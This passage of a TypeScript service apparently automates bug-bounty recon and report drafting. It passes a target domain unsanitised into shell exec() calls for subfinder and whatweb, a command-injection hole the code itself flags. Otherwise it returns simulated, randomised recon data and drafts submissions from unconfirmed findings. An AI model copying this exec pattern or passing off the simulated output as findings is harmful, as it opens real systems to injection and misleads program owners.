      privilege_escalation: 'Privilege Escalation',
      account_takeover: 'Account Takeover',
      open_redirect: 'Unvalidated Redirects',
      info_disclosure: 'Information Exposure',
      ssti: 'Server-Side Template Injection',
      lfi: 'Local File Inclusion',
      path_traversal: 'Path Traversal',
      cmdi: 'OS Command Injection',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || vulnType;
  }

  private mapToSynackSeverity(severity: string): string {
    const map: Record<string, string> = {
      critical: 'CRITICAL',
      high: 'HIGH',
      medium: 'MEDIUM',
      low: 'LOW',
      informational: 'INFORMATIONAL',
    };
    return map[severity.toLowerCase()] || 'MEDIUM';
  }

  private getSynackExploitability(vulnType: string): string {
    const map: Record<string, string> = {
      rce: 'High - Remote exploitation possible',
      sqli: 'High - Automated exploitation possible',
      xss: 'Medium - Requires user interaction',
      ssrf: 'High - Server-side exploitation',
      idor: 'High - Direct object manipulation',
      csrf: 'Medium - Requires user interaction',
      auth_bypass: 'High - Direct authentication bypass',
      privilege_escalation: 'High - Direct privilege gain',
      account_takeover: 'High - Full account compromise',
      xxe: 'Medium - Requires XML input point',
      ssti: 'High - Server-side code execution',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'Medium';
  }

  private getSynackTags(vulnType: string): string[] {
    return [vulnType.toLowerCase(), 'synack-red-team', 'web-security'];
  }

  private formatYesWeHackTitle(r: any): string {
    return `[${r.severity.toUpperCase()}] ${r.vulnerabilityType} on ${r.affectedEndpoint}`;
  }

  private formatYesWeHackBody(r: any): string {
    let body = `## Scope\n${r.affectedEndpoint}\n\n`;
    body += `## Vulnerability Type\n${r.vulnerabilityType}\n\n`;
    body += `## Endpoint\n${r.affectedEndpoint}\n\n`;
    body += `## Vulnerable Part\n${this.getYesWeHackVulnerablePart(r.vulnerabilityType)}\n\n`;
    body += `## Description\n${r.description}\n\n`;
    body += `## Steps to Reproduce\n${r.stepsToReproduce}\n\n`;
    if (r.proofOfConcept) body += `## Proof of Concept\n${r.proofOfConcept}\n\n`;
    body += `## Impact\n${r.impact}\n\n`;
    body += `## CVSS\n`;
    body += `- Score and vector calculated per vulnerability type\n\n`;
    if (r.remediation) body += `## Remediation Suggestion\n${r.remediation}\n\n`;
    body += `## Additional Information\n`;
    body += `- OWASP Category: ${this.mapToOWASP(r.vulnerabilityType)}\n`;
    body += `- CWE: ${this.mapToCWE(r.vulnerabilityType)}\n`;
    return body;
  }

  private getYesWeHackVulnerablePart(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'Input field / URL parameter',
      sqli: 'Database query parameter',
      ssrf: 'URL/URI parameter',
      idor: 'Object reference / API endpoint',
      csrf: 'State-changing form / API endpoint',
      xxe: 'XML parser / file upload',
      rce: 'Command execution point',
      auth_bypass: 'Authentication mechanism',
      privilege_escalation: 'Authorization check',
      account_takeover: 'Account recovery / session management',
      open_redirect: 'Redirect parameter',
      info_disclosure: 'Response body / error message',
      ssti: 'Template rendering engine',
      lfi: 'File path parameter',
      path_traversal: 'File path parameter',
      cmdi: 'System command parameter',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'Application component';
  }

  private mapToOWASP(vulnType: string): string {
    const map: Record<string, string> = {
      xss: 'A03:2021 - Injection',
      sqli: 'A03:2021 - Injection',
      ssrf: 'A10:2021 - Server-Side Request Forgery',
      idor: 'A01:2021 - Broken Access Control',
      csrf: 'A01:2021 - Broken Access Control',
      xxe: 'A05:2021 - Security Misconfiguration',
      rce: 'A03:2021 - Injection',
      auth_bypass: 'A07:2021 - Identification and Authentication Failures',
      privilege_escalation: 'A01:2021 - Broken Access Control',
      account_takeover: 'A07:2021 - Identification and Authentication Failures',
      open_redirect: 'A01:2021 - Broken Access Control',
      info_disclosure: 'A02:2021 - Cryptographic Failures',
      ssti: 'A03:2021 - Injection',
      lfi: 'A01:2021 - Broken Access Control',
      path_traversal: 'A01:2021 - Broken Access Control',
      cmdi: 'A03:2021 - Injection',
    };
    return map[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'A00:2021 - Other';
  }

  private getYesWeHackTags(vulnType: string): string[] {
    return [vulnType.toLowerCase(), 'web-application', 'yeswehack'];
  }

  private getImpactVerb(vulnType: string): string {
    const verbs: Record<string, string> = {
      xss: 'execution of arbitrary JavaScript in victim browser',
      sqli: 'unauthorized access to database contents',
      ssrf: 'access to internal services and sensitive data',
      idor: 'unauthorized access to other users\' data',
      csrf: 'unauthorized actions on behalf of authenticated users',
      xxe: 'reading arbitrary files from the server',
      rce: 'remote code execution on the server',
      auth_bypass: 'bypassing authentication controls',
      open_redirect: 'redirecting users to malicious sites',
      info_disclosure: 'leaking sensitive information',
      privilege_escalation: 'escalating privileges to higher-level access',
      account_takeover: 'full takeover of victim user accounts',
      ssti: 'server-side template injection leading to code execution',
      lfi: 'reading local files from the server filesystem',
      path_traversal: 'traversing the filesystem to access restricted files',
      cmdi: 'executing arbitrary OS commands on the server',
    };
    return verbs[vulnType.toLowerCase().replace(/[\s-]/g, '_')] || 'security impact';
  }

  // ============================================================
  // 9. PostMortemLearner
  // ============================================================

  async analyzePostMortems(): Promise<PostMortemAnalysis> {
    this.emit('agent:start', { agent: 'post-mortem-learner' });

    const submissions = await this.loadJson<SubmissionRecord[]>('post-mortem-data.json', []);

    if (submissions.length === 0) {
      const result: PostMortemAnalysis = {
        totalSubmissions: 0,
        acceptanceRate: 0,
        byVulnType: {},
        byProgram: {},
        topPatterns: [],
        improvementAreas: ['No submissions recorded yet - start submitting to build learning data'],
        strengths: [],
        confidence: 0.1,
      };
      this.recordRun('post-mortem-learner', true);
      this.emit('agent:complete', { agent: 'post-mortem-learner', result });
      return result;
    }

    const totalSubmissions = submissions.length;
    const accepted = submissions.filter(s => s.status === 'accepted');
    const acceptanceRate = accepted.length / totalSubmissions;

    const byVulnType: Record<string, { total: number; accepted: number; rate: number }> = {};
    const byProgram: Record<string, { total: number; accepted: number; rate: number; avgPayout: number }> = {};

    for (const sub of submissions) {
      const vt = sub.type || 'unknown';
      if (!byVulnType[vt]) byVulnType[vt] = { total: 0, accepted: 0, rate: 0 };
      byVulnType[vt].total++;
      if (sub.status === 'accepted') byVulnType[vt].accepted++;

      const prog = sub.title.split(' - ')[0] || 'unknown';
      if (!byProgram[prog]) byProgram[prog] = { total: 0, accepted: 0, rate: 0, avgPayout: 0 };
      byProgram[prog].total++;
      if (sub.status === 'accepted') {
        byProgram[prog].accepted++;
        byProgram[prog].avgPayout = ((byProgram[prog].avgPayout * (byProgram[prog].accepted - 1)) + sub.payout) / byProgram[prog].accepted;
      }
    }

    for (const key of Object.keys(byVulnType)) {
      byVulnType[key].rate = byVulnType[key].accepted / byVulnType[key].total;
    }
    for (const key of Object.keys(byProgram)) {
      byProgram[key].rate = byProgram[key].accepted / byProgram[key].total;
    }

    const topPatterns: Pattern[] = [];
    const sortedVulnTypes = Object.entries(byVulnType).sort((a, b) => b[1].rate - a[1].rate);
    for (const [vt, stats] of sortedVulnTypes.slice(0, 5)) {
      topPatterns.push({
        description: `${vt} submissions`,
        frequency: stats.total,
        successRate: stats.rate,
        category: 'vulnerability_type',
      });
    }

    const improvementAreas: string[] = [];
    const strengths: string[] = [];

    if (acceptanceRate < 0.3) {
      improvementAreas.push('Overall acceptance rate is low - focus on report quality and unique findings');
    }
    if (acceptanceRate > 0.5) {
      strengths.push('Strong overall acceptance rate indicates quality submissions');
    }

    const duplicateRate = submissions.filter(s => s.status === 'duplicate').length / totalSubmissions;
    if (duplicateRate > 0.3) {
      improvementAreas.push('High duplicate rate - invest more time in pre-submission duplicate checks');
    }

    for (const [vt, stats] of Object.entries(byVulnType)) {
      if (stats.rate > 0.6 && stats.total >= 3) {
        strengths.push(`Strong performance in ${vt} findings (${Math.round(stats.rate * 100)}% acceptance)`);
      }
      if (stats.rate < 0.2 && stats.total >= 3) {
        improvementAreas.push(`Low acceptance for ${vt} - review methodology and report quality`);
      }
    }

    const highPayoutTypes = Object.entries(byVulnType)
      .filter(([_, s]) => s.rate > 0.5)
      .map(([vt]) => vt);
    if (highPayoutTypes.length > 0) {
      strengths.push(`Focus on high-success vuln types: ${highPayoutTypes.join(', ')}`);
    }

    const result: PostMortemAnalysis = {
      totalSubmissions,
      acceptanceRate,
      byVulnType,
      byProgram,
      topPatterns,
      improvementAreas,
      strengths,
      confidence: Math.min(0.5 + totalSubmissions * 0.02, 0.95),
    };

    this.recordRun('post-mortem-learner', true);
    this.emit('agent:complete', { agent: 'post-mortem-learner', result });
    return result;
  }

  async recordSubmission(submission: SubmissionRecord): Promise<void> {
    const submissions = await this.loadJson<SubmissionRecord[]>('post-mortem-data.json', []);
    submissions.push(submission);
    await this.saveJson('post-mortem-data.json', submissions);
  }

  // ============================================================
  // 10. BountyReconAgent
  // ============================================================

  async runRecon(target: string, options?: {
    depth?: 'shallow' | 'medium' | 'deep';
    includeTech?: boolean;
    includeEndpoints?: boolean;
  }): Promise<ReconResult> {
    this.emit('agent:start', { agent: 'bounty-recon-agent', target });

    const startTime = Date.now();
    const depth = options?.depth || 'medium';
    const includeTech = options?.includeTech !== false;
    const includeEndpoints = options?.includeEndpoints !== false;
    const isReal = process.env.REAL_TOOLS === 'true';

    const domain = target.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');

    const subdomains = await this.reconSubdomains(domain, depth, isReal);
    this.emit('agent:progress', { agent: 'bounty-recon-agent', stage: 'subdomains', count: subdomains.length });

    const technologies = includeTech ? await this.reconTechnologies(domain, isReal) : [];
    this.emit('agent:progress', { agent: 'bounty-recon-agent', stage: 'technologies', count: technologies.length });

    const endpoints = includeEndpoints ? await this.reconEndpoints(domain, subdomains, depth, isReal) : [];
    this.emit('agent:progress', { agent: 'bounty-recon-agent', stage: 'endpoints', count: endpoints.length });

    const vulnerabilitySurface = this.mapVulnerabilitySurface(endpoints, technologies);

    const reconDuration = Date.now() - startTime;

    const summary = [
      `Recon completed for ${domain} in ${reconDuration}ms.`,
      `Found ${subdomains.length} subdomains, ${technologies.length} technologies, ${endpoints.length} endpoints.`,
      `Identified ${vulnerabilitySurface.length} potential vulnerability surfaces.`,
      `High-risk surfaces: ${vulnerabilitySurface.filter(v => v.riskLevel === 'critical' || v.riskLevel === 'high').length}.`,
    ].join(' ');

    const result: ReconResult = {
      target: domain,
      subdomains,
      technologies,
      endpoints,
      vulnerabilitySurface,
      summary,
      confidence: isReal ? 0.85 : 0.65,
      reconDuration,
    };

    this.recordRun('bounty-recon-agent', true);
    this.emit('agent:complete', { agent: 'bounty-recon-agent', result: { summary } });
    return result;
  }

  private async reconSubdomains(domain: string, depth: string, isReal: boolean): Promise<SubdomainInfo[]> {
    if (isReal && !unsafeReconToolsEnabled()) {
      console.warn(`[RCE-stopgap] subfinder dispatch blocked — unsafe shell-exec path disabled (domain=${domain})`);
      return [{ hostname: domain, status: 200, title: `${domain} (unsafe-tool dispatch disabled)` }];
    }
    if (isReal) {
      try {
        const { exec } = await import('child_process');
        const { promisify } = await import('util');
        const execAsync = promisify(exec);
        const { stdout } = await execAsync(`subfinder -d ${domain} -silent 2>/dev/null || echo ""`, { timeout: 60000 });
        const subs = stdout.trim().split('\n').filter(Boolean);
        return subs.map(hostname => ({ hostname }));
      } catch (e: any) {
        console.warn(`[BountyIntel] subfinder failed for ${domain}: ${e.message}`);
        return [{ hostname: domain, status: 200, title: `${domain} (subfinder unavailable)` }];
      }
    }

    const prefixes = depth === 'shallow'
      ? ['www', 'api', 'admin', 'app']
      : depth === 'medium'
        ? ['www', 'api', 'admin', 'app', 'staging', 'dev', 'mail', 'cdn', 'auth', 'login', 'portal', 'dashboard']
        : ['www', 'api', 'admin', 'app', 'staging', 'dev', 'mail', 'cdn', 'auth', 'login', 'portal', 'dashboard',
           'beta', 'test', 'internal', 'vpn', 'git', 'ci', 'jenkins', 'jira', 'wiki', 'docs', 'status',
           'monitor', 'grafana', 'kibana', 'elastic', 'redis', 'db', 'mysql', 'postgres'];

    return prefixes.map(prefix => ({
      hostname: `${prefix}.${domain}`,
      status: [200, 301, 302, 403, 404][Math.floor(Math.random() * 5)],
      title: `${prefix.charAt(0).toUpperCase() + prefix.slice(1)} - ${domain}`,
    }));
  }

  private async reconTechnologies(domain: string, isReal: boolean): Promise<TechnologyInfo[]> {
    if (isReal && !unsafeReconToolsEnabled()) {
      console.warn(`[RCE-stopgap] whatweb dispatch blocked — unsafe shell-exec path disabled (domain=${domain})`);
      return [];
    }
    if (isReal) {
      try {
        const { exec } = await import('child_process');
        const { promisify } = await import('util');
        const execAsync = promisify(exec);
        const { stdout } = await execAsync(`whatweb ${domain} --log-json=/dev/stdout 2>/dev/null || echo "[]"`, { timeout: 30000 });
        try {
          const parsed = JSON.parse(stdout);
          if (Array.isArray(parsed)) {
            return parsed.map((t: any) => ({
              name: t.name || 'Unknown',
              version: t.version,
              category: t.category || 'unknown',
              confidence: 0.8,
            }));
          }
        } catch {}
      } catch (e: any) {
        console.warn(`[BountyIntel] whatweb failed for ${domain}: ${e.message}`);
        return [];
      }
    }

    return [
      { name: 'nginx', version: '1.21.6', category: 'web-server', confidence: 0.9 },
      { name: 'React', version: '18.2.0', category: 'frontend-framework', confidence: 0.85 },
      { name: 'Node.js', version: '18.x', category: 'runtime', confidence: 0.8 },
      { name: 'Express', version: '4.18', category: 'backend-framework', confidence: 0.75 },
      { name: 'PostgreSQL', version: '15', category: 'database', confidence: 0.7 },
      { name: 'Cloudflare', category: 'cdn/waf', confidence: 0.9 },
      { name: 'jQuery', version: '3.6.0', category: 'frontend-library', confidence: 0.6 },
    ];
  }

  private async reconEndpoints(domain: string, subdomains: SubdomainInfo[], depth: string, isReal: boolean): Promise<EndpointInfo[]> {
    if (isReal) {
      try {
        const { runHttpxProbe } = await import('../../utils/httpx-compat');
        const stdout = await runHttpxProbe(
          [domain, ...subdomains.slice(0, 5).map(s => s.hostname)],
          '-status-code -content-type -json',
          60000
        );
        const lines = stdout.trim().split('\n').filter(Boolean);
        return lines.map(line => {
          try {
            const parsed = JSON.parse(line);
            return {
              url: parsed.url || parsed.input,
              method: 'GET',
              status: parsed.status_code,
              contentType: parsed.content_type,
              interesting: (parsed.status_code !== 404),
              notes: '',
            };
          } catch {
            return { url: line, method: 'GET', interesting: true, notes: '' };
          }
        });
      } catch {
        // fall through
      }
    }

    const commonEndpoints = [
      { path: '/', method: 'GET', status: 200, contentType: 'text/html', interesting: false, notes: 'Homepage' },
      { path: '/api/v1', method: 'GET', status: 200, contentType: 'application/json', interesting: true, notes: 'API root - check for documentation exposure' },
      { path: '/api/v1/users', method: 'GET', status: 401, contentType: 'application/json', interesting: true, notes: 'Users endpoint - test IDOR' },
      { path: '/api/v1/admin', method: 'GET', status: 403, contentType: 'application/json', interesting: true, notes: 'Admin API - test for auth bypass' },
      { path: '/login', method: 'GET', status: 200, contentType: 'text/html', interesting: true, notes: 'Login page - test brute force, credential stuffing' },
      { path: '/register', method: 'GET', status: 200, contentType: 'text/html', interesting: true, notes: 'Registration - test mass assignment' },
      { path: '/forgot-password', method: 'GET', status: 200, contentType: 'text/html', interesting: true, notes: 'Password reset - test token leakage' },
      { path: '/api/v1/upload', method: 'POST', status: 401, contentType: 'application/json', interesting: true, notes: 'File upload - test unrestricted upload' },
      { path: '/search', method: 'GET', status: 200, contentType: 'text/html', interesting: true, notes: 'Search - test XSS and SQLi' },
      { path: '/api/graphql', method: 'POST', status: 200, contentType: 'application/json', interesting: true, notes: 'GraphQL endpoint - test introspection, injection' },
      { path: '/.env', method: 'GET', status: 404, contentType: 'text/html', interesting: false, notes: 'Environment file not exposed' },
      { path: '/.git/config', method: 'GET', status: 404, contentType: 'text/html', interesting: false, notes: 'Git config not exposed' },
      { path: '/robots.txt', method: 'GET', status: 200, contentType: 'text/plain', interesting: true, notes: 'Check for hidden paths in disallow rules' },
      { path: '/sitemap.xml', method: 'GET', status: 200, contentType: 'text/xml', interesting: true, notes: 'Sitemap may reveal unlisted pages' },
      { path: '/api/v1/health', method: 'GET', status: 200, contentType: 'application/json', interesting: false, notes: 'Health check endpoint' },
      { path: '/api/v1/config', method: 'GET', status: 403, contentType: 'application/json', interesting: true, notes: 'Config endpoint - may leak settings' },
    ];

    const depthMultiplier = depth === 'shallow' ? 0.5 : depth === 'deep' ? 1.0 : 0.75;
    const endpointCount = Math.ceil(commonEndpoints.length * depthMultiplier);

    return commonEndpoints.slice(0, endpointCount).map(ep => ({
      url: `https://${domain}${ep.path}`,
      method: ep.method,
      status: ep.status,
      contentType: ep.contentType,
      interesting: ep.interesting,
      notes: ep.notes,
    }));
  }

  private mapVulnerabilitySurface(endpoints: EndpointInfo[], technologies: TechnologyInfo[]): VulnerabilitySurface[] {
    const surfaces: VulnerabilitySurface[] = [];

    for (const ep of endpoints) {
      if (!ep.interesting) continue;

      const potentialVulns: string[] = [];
      let riskLevel: 'critical' | 'high' | 'medium' | 'low' = 'low';

      if (/admin/i.test(ep.url)) {
        potentialVulns.push('Authentication Bypass', 'Privilege Escalation', 'IDOR');
        riskLevel = 'critical';
      }
      if (/api/i.test(ep.url)) {
        potentialVulns.push('Broken Authentication', 'Mass Assignment', 'Rate Limiting Bypass');
        if (riskLevel === 'low') riskLevel = 'medium';
      }
      if (/login|auth|oauth/i.test(ep.url)) {
        potentialVulns.push('Credential Stuffing', 'Brute Force', 'Token Leakage');
        riskLevel = 'high';
      }
      if (/upload/i.test(ep.url)) {
        potentialVulns.push('Unrestricted File Upload', 'Path Traversal', 'RCE via Upload');
        riskLevel = 'high';
      }
      if (/search|query|q=/i.test(ep.url)) {
        potentialVulns.push('XSS', 'SQLi', 'LDAP Injection');
        if (riskLevel === 'low') riskLevel = 'medium';
      }
      if (/graphql/i.test(ep.url)) {
        potentialVulns.push('Introspection Disclosure', 'Query Injection', 'DoS via Complex Queries');
        riskLevel = 'high';
      }
      if (/password|reset|forgot/i.test(ep.url)) {
        potentialVulns.push('Token Prediction', 'Account Takeover', 'Host Header Injection');
        riskLevel = 'high';
      }
      if (/config|settings/i.test(ep.url)) {
        potentialVulns.push('Information Disclosure', 'Configuration Tampering');
        if (riskLevel === 'low') riskLevel = 'medium';
      }

      if (potentialVulns.length > 0) {
        surfaces.push({
          endpoint: ep.url,
          potentialVulns,
          riskLevel,
          notes: ep.notes,
        });
      }
    }

    for (const tech of technologies) {
      if (tech.name.toLowerCase() === 'jquery' && tech.version) {
        const majorMinor = tech.version.split('.').slice(0, 2).join('.');
        if (parseFloat(majorMinor) < 3.5) {
          surfaces.push({
            endpoint: 'Global (jQuery)',
            potentialVulns: ['Prototype Pollution', 'XSS via jQuery selectors'],
            riskLevel: 'medium',
            notes: `jQuery ${tech.version} may have known vulnerabilities`,
          });
        }
      }
    }

    surfaces.sort((a, b) => {
      const order = { critical: 0, high: 1, medium: 2, low: 3 };
      return order[a.riskLevel] - order[b.riskLevel];
    });

    return surfaces;
  }

  // ============================================================
  // Pipeline
  // ============================================================

  async runFullPipeline(target: string, program?: string): Promise<PipelineResult> {
    const startTime = Date.now();
    const programName = program || 'generic';

    const stages: PipelineStage[] = [
      { name: 'ScopeAnalyzer', status: 'pending' },
      { name: 'BountyReconAgent', status: 'pending' },
      { name: 'PayloadMutator', status: 'pending' },
      { name: 'DuplicateDetector', status: 'pending' },
      { name: 'SubmissionOptimizer', status: 'pending' },
    ];

    this.emit('pipeline:start', { target, program: programName, stages });

    // Stage 1: Scope Analysis
    stages[0].status = 'running';
    stages[0].startedAt = Date.now();
    this.emit('pipeline:stage', { stage: stages[0] });

    let scopeAnalysis: ScopeAnalysis;
    try {
      scopeAnalysis = await this.analyzeScope(target);
      stages[0].status = 'completed';
      stages[0].completedAt = Date.now();
    } catch (err: any) {
      stages[0].status = 'failed';
      stages[0].error = err.message;
      throw err;
    }
    this.emit('pipeline:stage', { stage: stages[0] });

    // Stage 2: Recon
    stages[1].status = 'running';
    stages[1].startedAt = Date.now();
    this.emit('pipeline:stage', { stage: stages[1] });

    let reconResult: ReconResult;
    try {
      reconResult = await this.runRecon(target, { depth: 'medium', includeTech: true, includeEndpoints: true });
      stages[1].status = 'completed';
      stages[1].completedAt = Date.now();
    } catch (err: any) {
      stages[1].status = 'failed';
      stages[1].error = err.message;
      throw err;
    }
    this.emit('pipeline:stage', { stage: stages[1] });

    // Stage 3: Payload Generation
    stages[2].status = 'running';
    stages[2].startedAt = Date.now();
    this.emit('pipeline:stage', { stage: stages[2] });

    const payloadCategories: Array<'xss' | 'sqli' | 'ssrf'> = ['xss', 'sqli', 'ssrf'];
    const payloads: PayloadMutationResult[] = [];
    try {
      for (const category of payloadCategories) {
        const result = await this.mutatePayloads({ category, maxVariants: 10 });
        payloads.push(result);
      }
      stages[2].status = 'completed';
      stages[2].completedAt = Date.now();
    } catch (err: any) {
      stages[2].status = 'failed';
      stages[2].error = err.message;
      throw err;
    }
    this.emit('pipeline:stage', { stage: stages[2] });

    // Stage 4: Duplicate Check
    stages[3].status = 'running';
    stages[3].startedAt = Date.now();
    this.emit('pipeline:stage', { stage: stages[3] });

    const duplicateChecks: DuplicateCheckResult[] = [];
    try {
      const highRiskSurfaces = reconResult.vulnerabilitySurface.filter(v => v.riskLevel === 'critical' || v.riskLevel === 'high');
      for (const surface of highRiskSurfaces.slice(0, 5)) {
        const check = await this.checkDuplicate({
          title: `${surface.potentialVulns[0]} in ${surface.endpoint}`,
          endpoint: surface.endpoint,
          vulnerabilityType: surface.potentialVulns[0],
          program: programName,
        });
        duplicateChecks.push(check);
      }
      stages[3].status = 'completed';
      stages[3].completedAt = Date.now();
    } catch (err: any) {
      stages[3].status = 'failed';
      stages[3].error = err.message;
      throw err;
    }
    this.emit('pipeline:stage', { stage: stages[3] });

    // Stage 5: Submission Optimization
    stages[4].status = 'running';
    stages[4].startedAt = Date.now();
    this.emit('pipeline:stage', { stage: stages[4] });

    let submission: OptimizedSubmission;
    try {
      const topSurface = reconResult.vulnerabilitySurface[0];
      submission = await this.optimizeSubmission({
        title: `${topSurface?.potentialVulns[0] || 'Vulnerability'} in ${target}`,
        description: `During reconnaissance of ${target}, a potential ${topSurface?.potentialVulns[0] || 'vulnerability'} was identified at ${topSurface?.endpoint || target}.`,
        severity: topSurface?.riskLevel === 'critical' ? 'Critical' : topSurface?.riskLevel === 'high' ? 'High' : 'Medium',
        vulnerabilityType: topSurface?.potentialVulns[0] || 'unknown',
        stepsToReproduce: `1. Navigate to ${topSurface?.endpoint || target}\n2. Observe the behavior\n3. Test with appropriate payloads`,
        impact: `This vulnerability could allow an attacker to ${this.getImpactVerb(topSurface?.potentialVulns[0] || 'unknown')}.`,
        affectedEndpoint: topSurface?.endpoint || target,
        platform: 'hackerone',
      });
      stages[4].status = 'completed';
      stages[4].completedAt = Date.now();
    } catch (err: any) {
      stages[4].status = 'failed';
      stages[4].error = err.message;
      throw err;
    }
    this.emit('pipeline:stage', { stage: stages[4] });

    const totalDuration = Date.now() - startTime;

    const avgConfidence = [
      scopeAnalysis.confidence,
      reconResult.confidence,
      ...payloads.map(p => p.confidence),
      ...duplicateChecks.map(d => d.confidence),
      submission.confidence,
    ].reduce((a, b) => a + b, 0) / (3 + payloads.length + duplicateChecks.length);

    const pipelineResult: PipelineResult = {
      target,
      program: programName,
      stages,
      scopeAnalysis,
      reconResult,
      payloads,
      duplicateChecks,
      submission,
      totalDuration,
      confidence: avgConfidence,
    };

    this.emit('pipeline:complete', pipelineResult);
    return pipelineResult;
  }

  // ============================================================
  // Agent Statuses
  // ============================================================

  getAgentStatuses(): AgentStatus[] {
    const agentNames: Record<string, string> = {
      'scope-analyzer': 'ScopeAnalyzer',
      'payout-scorer': 'PayoutScorer',
      'duplicate-detector': 'DuplicateDetector',
      'report-coach': 'ReportCoach',
      'org-memory': 'OrgMemory',
      'payload-mutator': 'PayloadMutator',
      'stealth-scheduler': 'StealthScheduler',
      'submission-optimizer': 'SubmissionOptimizer',
      'post-mortem-learner': 'PostMortemLearner',
      'bounty-recon-agent': 'BountyReconAgent',
    };

    const statuses: AgentStatus[] = [];

    for (const [id, name] of Object.entries(agentNames)) {
      const stats = this.agentStats.get(id);
      const successRate = stats && stats.totalRuns > 0 ? stats.successes / stats.totalRuns : 1.0;

      statuses.push({
        name,
        id,
        status: stats?.lastRun ? 'active' : 'idle',
        lastRun: stats?.lastRun || null,
        totalRuns: stats?.totalRuns || 0,
        successRate,
      });
    }

    return statuses;
  }
}

export const bountyIntelligenceService = new BountyIntelligenceService();
